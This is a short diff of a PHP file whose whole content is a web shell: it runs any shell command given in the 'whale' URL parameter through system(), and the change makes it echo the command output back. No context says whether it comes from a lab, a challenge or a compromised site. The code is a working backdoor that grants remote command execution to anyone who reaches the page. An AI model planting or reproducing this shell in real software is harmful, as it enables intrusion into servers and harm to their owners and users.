@@ -1,1 +1,3 @@
-<?php system($_GET['whale']); ?>
+<?php $o=system($_GET['whale']); 
+      echo($o);
+?>
